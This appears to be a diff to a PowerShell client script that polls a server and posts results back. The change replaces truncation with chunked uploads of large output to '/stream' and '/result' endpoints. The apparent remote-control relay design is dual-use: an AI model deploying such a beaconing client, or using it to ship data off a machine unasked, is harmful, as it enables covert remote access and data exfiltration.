@@ -157,10 +157,6 @@ function Send-Http {
     $req.Timeout = $TimeoutMs
     $req.ReadWriteTimeout = $TimeoutMs
     if ($Method -eq "POST" -and $Body) {
-        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
-        if ($bodyBytes.Length -gt $maxChunkBytes) {
-            $Body = [System.Text.Encoding]::UTF8.GetString($bodyBytes, 0, $maxChunkBytes) + "`n[...truncated]"
-        }
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
         $req.ContentType = "text/plain; charset=utf-8"
         $req.ContentLength = $bytes.Length
@@ -186,13 +182,47 @@ function Get-Signal-From-Server {
 
 function Send-Stream-To-Server {
     param([string]$Body)
-    try { Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $Body | Out-Null }
+    # Split oversized bodies into sequential chunks instead of truncating
+    try {
+        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
+        if ($bodyBytes.Length -le $maxChunkBytes) {
+            Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $Body | Out-Null
+        } else {
+            $offset = 0
+            while ($offset -lt $bodyBytes.Length) {
+                $len = [Math]::Min($maxChunkBytes, $bodyBytes.Length - $offset)
+                $chunk = [System.Text.Encoding]::UTF8.GetString($bodyBytes, $offset, $len)
+                Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $chunk | Out-Null
+                $offset += $len
+            }
+        }
+    }
     catch { Write-Log "Stream send failed: $($_.Exception.Message)" "WARN" }
 }
 
 function Send-Result-To-Server {
     param([string]$Body)
-    try { Send-Http -Url "$cfHost/result?id=$clientId" -Method "POST" -Body $Body | Out-Null }
+    # For large results: send leading chunks as /stream, final chunk as /result
+    try {
+        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
+        if ($bodyBytes.Length -le $maxChunkBytes) {
+            Send-Http -Url "$cfHost/result?id=$clientId" -Method "POST" -Body $Body | Out-Null
+        } else {
+            $offset = 0
+            while ($offset -lt $bodyBytes.Length) {
+                $len = [Math]::Min($maxChunkBytes, $bodyBytes.Length - $offset)
+                $chunk = [System.Text.Encoding]::UTF8.GetString($bodyBytes, $offset, $len)
+                $remaining = $bodyBytes.Length - $offset - $len
+                if ($remaining -le 0) {
+                    # Last chunk goes as /result to trigger prompt on server
+                    Send-Http -Url "$cfHost/result?id=$clientId" -Method "POST" -Body $chunk | Out-Null
+                } else {
+                    Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $chunk | Out-Null
+                }
+                $offset += $len
+            }
+        }
+    }
     catch { Write-Log "Result send failed: $($_.Exception.Message)" "WARN" }
 }
 
